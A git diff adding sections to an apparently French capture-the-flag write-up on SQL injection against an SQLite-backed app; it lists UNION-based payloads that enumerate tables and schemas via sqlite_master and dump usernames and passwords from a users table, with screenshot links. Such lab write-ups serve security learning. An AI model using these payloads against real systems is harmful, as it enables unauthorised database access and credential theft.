@@ -48,4 +48,32 @@ Database version : SQLite3
 
 ![Pasted image 20221123142951](https://user-images.githubusercontent.com/122984033/213182251-f8688658-98f8-41ff-adef-d2c3e06f2f4e.png)
 
+### Tables
+```sql
+' UNION SELECT null,name FROM sqlite_master WHERE type='table' -- 
+```
+![Pasted image 20221123142924](https://user-images.githubusercontent.com/122984033/213182410-affcd2ee-e013-4412-ae5f-8f2898b5c88e.png)
+
+### Schema Tables
+```sql
+' UNION SELECT null,sql FROM sqlite_master WHERE type='table' -- 
+```
+![Pasted image 20221123143111](https://user-images.githubusercontent.com/122984033/213182667-6599c824-048b-408f-a0e1-fa306d465e06.png)
+
+### Identifiants
+```sql
+' UNION SELECT null,null OR 1=1
+
+' UNION SELECT username,password FROM users -- 
+```
+
+## Flag
+
+![Pasted image 20221123145118](https://user-images.githubusercontent.com/122984033/213182786-d5d61278-33ad-4465-b3f2-1719f0c7c521.png)
+
+
+
+
+
+
 
